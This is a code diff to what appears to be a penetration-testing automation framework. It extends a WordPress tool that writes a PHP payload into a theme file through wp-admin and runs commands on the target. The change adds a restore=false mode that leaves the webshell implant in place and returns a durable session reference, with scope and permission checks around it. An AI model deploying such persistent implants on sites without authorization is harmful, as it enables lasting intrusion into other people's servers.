@@ -33,6 +33,8 @@ from typing import Any
 
 from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
 from nexus_core.kernel.sandbox import sandbox_for_environment
+from nexus_core.kernel.sessions import open_webshell_session
+from nexus_core.scope import ScopeViolation
 from nexus_core.tools.parsers.wordpress import (
     WordPressFindings,
     extract_assets,
@@ -743,7 +745,8 @@ def wp_exec_definition(tenant_id: str = "system") -> ToolDefinition:
             "Con credenciales wp-admin válidas, escribe un payload PHP en un "
             "fichero de tema desde el editor integrado, ejecuta comandos como "
             "el usuario web y **restaura** el fichero original al terminar. "
-            "HIGH: ejecuta código en el objetivo."
+            "Con restore=false deja el implante y devuelve un session_ref "
+            "webshell durable. HIGH: ejecuta código en el objetivo."
         ),
         input_schema={
             "type": "object",
@@ -883,6 +886,21 @@ async def wp_exec_handler(arguments: dict, context: RunContext) -> ToolResult:
         and len(outputs) == len(commands)
         and len(executed) == len(commands)
     )
+    # A durable session only exists when the implant survives the call: with the
+    # default ``restore=true`` the theme file is put back, so a session_ref would
+    # point at a URL that no longer executes anything.
+    session_ref = ""
+    if complete and not restore and payload.get("shell_url"):
+        try:
+            session_ref = open_webshell_session(
+                context,
+                url=str(payload["shell_url"]),
+                method="GET",
+                parameter=WP_EXEC_PARAMETER,
+                opened_by_tool="nexus.web.wp_exec",
+            )
+        except (PermissionError, ValueError, ScopeViolation):
+            session_ref = ""
     evidence.update(
         {
             "authenticated": payload.get("authenticated"),
@@ -890,6 +908,7 @@ async def wp_exec_handler(arguments: dict, context: RunContext) -> ToolResult:
             "restored": payload.get("restored"),
             "executed": len(executed),
             "client_error": payload.get("error"),
+            "session_ref": session_ref or None,
         }
     )
     return ToolResult(
@@ -904,6 +923,8 @@ async def wp_exec_handler(arguments: dict, context: RunContext) -> ToolResult:
             "outputs": outputs,
             "error": payload.get("error"),
             "preview": payload.get("preview"),
+            "session_ref": session_ref or None,
+            "session_type": "webshell" if session_ref else None,
         },
         verified=complete,
         verification_method="wp_command_executed",
